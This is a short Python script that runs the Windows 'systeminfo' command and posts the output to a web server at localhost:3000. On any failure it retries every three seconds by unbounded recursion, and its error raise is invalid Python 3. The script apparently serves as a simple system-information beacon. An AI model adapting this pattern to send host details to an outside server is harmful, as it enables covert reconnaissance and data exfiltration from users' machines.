import  requests 
import os
import time

url= 'https://localhost:3000'

data= {
        "info": os.popen('systeminfo').read()
}

def main():
    try:
        response= requests.post(url=url, json=data)
        if response.status_code != 200:
            raise "Not Ok"
    except:
        time.sleep(3)
        main()

if __name__=="__main__":
    main()
